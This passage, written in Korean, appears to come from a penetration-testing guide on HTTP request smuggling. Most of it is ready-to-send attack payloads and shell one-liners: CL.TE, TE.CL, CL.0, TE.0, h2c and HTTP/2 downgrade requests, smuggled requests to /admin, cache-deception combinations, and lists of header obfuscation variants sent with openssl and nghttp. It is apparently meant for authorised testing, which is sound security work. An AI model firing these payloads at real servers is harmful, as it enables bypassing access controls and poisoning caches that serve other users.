**HTTP Smuggling은 소스코드에 프록시 설정이 없어도 반드시 동적 테스트.** 인프라 레벨에서 관리되는 경우가 일반적.

### 기본 페이로드

#### 기준선 측정
```bash
START=$(date +%s%N)
printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n' \
  | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null | head -3
END=$(date +%s%N)
echo "Baseline: $(( ($END - $START) / 1000000 ))ms"
```

#### CL.TE (프론트=CL, 백엔드=TE)
```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

1
Z
Q
```
정상 <100ms, 취약 5s+ (불완전 청크가 백엔드 타임아웃 유발)

#### TE.CL (프론트=TE, 백엔드=CL)
```
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

#### Self-poisoning (확정 검증)
```bash
# 같은 커넥션에서 밀수 + 후속 요청
(printf 'POST / HTTP/1.1\r\nHost: TARGET\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: TARGET\r\n\r\n'; sleep 0.5; printf 'GET / HTTP/1.1\r\nHost: TARGET\r\nConnection: close\r\n\r\n') \
  | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null | grep "^HTTP/"
# 두 번째 응답이 404이면 밀수 성공
```

**HTTP/2 → HTTP/1.1 downgrade** (`H2_DOWNGRADE` 라벨):
```bash
# HTTP/2 헤더값에 CRLF — gateway 변환 시 인젝션
curl --http2 "https://target/" -H "Foo: bar
Smuggled: yes"
```

#### CL.0 (2024 신변형)
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 0

GET /admin HTTP/1.1
Host: TARGET

```

#### 0.CL (CL 미선언)
```
POST / HTTP/1.1
Host: TARGET

GET /admin HTTP/1.1
Host: TARGET

```

#### Expect: 100-continue 처리 차이
```
POST / HTTP/1.1
Host: TARGET
Content-Length: 100
Expect: 100-continue
Transfer-Encoding: chunked

(100 응답 없이 본문 즉시 전송)
```

#### TE.0 (2024 신변형 — Google Cloud Load Balancer 등)

```
POST / HTTP/1.1
Host: TARGET
Content-Length: 5
Transfer-Encoding: chunked
Transfer-Encoding: chunked-x

0

GET /admin HTTP/1.1
Host: TARGET

```

프론트가 TE 인식 (chunked → 0 종료) → 백엔드가 TE 무시하면 뒤 GET이 별도 요청.

#### h2c smuggling (HTTP/2 cleartext upgrade)

```
GET / HTTP/1.1
Host: TARGET
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA

```

응답이 `101 Switching Protocols`이면 reverse proxy가 raw TCP를 backend에 forwarding → backend가 HTTP/2로 해석 → smuggling 가능.

```bash
# h2c upgrade + 후속 HTTP/2 frame 직접 전송
nghttp -v --upgrade "http://target/" 2>&1 | grep -E "101|HTTP/2"

# 후속 HTTP/2 SETTINGS frame + HEADERS로 admin 요청
# nghttp2 + custom payload (raw frame 전송)
```

#### HTTP/2 frame 직접 페이로드 (H2.CL / H2.TE downgrade)

```
# H2.CL: HTTP/2 → HTTP/1.1 변환 시 Content-Length가 frame size보다 작으면 잔존 데이터가 다음 요청
echo -e "POST / HTTP/2\nHost: TARGET\ncontent-length: 0\n\nGGET /admin HTTP/1.1\nHost: TARGET\n\n" | h2-frame-tool

# H2.TE: HTTP/2 헤더에 Transfer-Encoding: chunked 포함 (RFC 위반이지만 일부 gateway 통과)
nghttp -v -H "transfer-encoding: chunked" "https://target/"
# 200이 아닌 400/505 외 응답이면 downgrade 의심
```

#### Cache deception + smuggling
```
# 정적 확장자 경로 (`/user.js`)로 smuggle된 요청이 캐시되어 재사용
POST /user.js HTTP/1.1
Host: TARGET
Content-Length: 0
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET

```

---

#### 우회 페이로드 (TE 헤더 변형)

| 변형 | 헤더 |
|---|---|
| Space before colon | `Transfer-Encoding : chunked` |
| Tab separator | `Transfer-Encoding:\tchunked` |
| Substring | `Transfer-Encoding: xchunked` |
| Duplicate | `Transfer-Encoding: chunked\r\nTransfer-Encoding: x` |
| Underscore (HTTP/2 변환) | `Transfer_Encoding: chunked` |
| Capitalization | `transfer-Encoding: ChUnKeD` |
| Comma separation | `Transfer-Encoding: chunked, identity` |
| Whitespace value | `Transfer-Encoding:  chunked` (2 spaces) |
| `\x0bchunked` (vertical tab) | `Transfer-Encoding: \x0bchunked` |
| `chunked,` trailing comma | `Transfer-Encoding: chunked,` |

각 변형에 대해 위 CL.TE 패턴 시간 측정:
```bash
for variant in 'Transfer-Encoding : chunked' $'Transfer-Encoding:\tchunked' 'Transfer-Encoding: xchunked'; do
  printf "POST / HTTP/1.1\r\nHost: TARGET\r\nContent-Length: 4\r\n${variant}\r\n\r\n1\r\nZ\r\nQ" \
    | timeout 10 openssl s_client -connect TARGET:443 -quiet 2>/dev/null
done
```

#### CL 변형
```
Content-Length:0
Content-Length: 0\r
Content-Length: 1, 0
Content-Length:\r\n 0
content-Length: 0
```

---

### 참고사항

- 소스코드만으론 거의 확정 불가 — 동적 테스트가 결정적
- HTTPS 환경에선 raw TCP가 어려움 — `openssl s_client` 또는 Burp Repeater 필요
- Cache poisoning 결합: smuggle된 요청이 캐시 응답으로 다른 사용자에게 영향
- HTTP/2 end-to-end 환경은 자체 smuggling 차단되나, gRPC→REST adapter 같은 변환 지점은 노출
- Node.js `--insecure-http-parser` 플래그는 즉시 후보
- nginx `proxy_http_version 1.1` + `proxy_set_header Connection ""` 권장
- AWS ALB, CloudFront, Cloudflare 등 알려진 CVE 점검 (특히 2024 CL.0 변형)
- Apache Traffic Server, IIS, F5 BIG-IP 등 벤더별 알려진 취약점
- Burp Suite의 HTTP Request Smuggler 확장이 자동 탐지에 효과적
- prod 도메인 동적 테스트는 절대 금지 — sandbox/staging 한정 (가이드 지침 11)
- Self-poisoning은 같은 TCP connection에서 밀수 + 후속 요청 — keep-alive 활성 환경
- HTTP/2 downgrade는 HTTP/2 헤더 끝의 CRLF가 backend HTTP/1.1로 변환되며 인젝션
- CL.0은 James Kettle 2024 발표 — 신규 backend (Node.js, Go) 환경에 영향
- 0.CL은 프론트가 CL 없는 요청을 신뢰, 백엔드가 CL 요구하면 다음 요청에 합쳐짐
- Expect: 100-continue + Transfer-Encoding 조합도 우회 게이트
- Cache deception은 정적 확장자 경로 (`/user.js`)로 smuggle하면 캐시되어 재사용
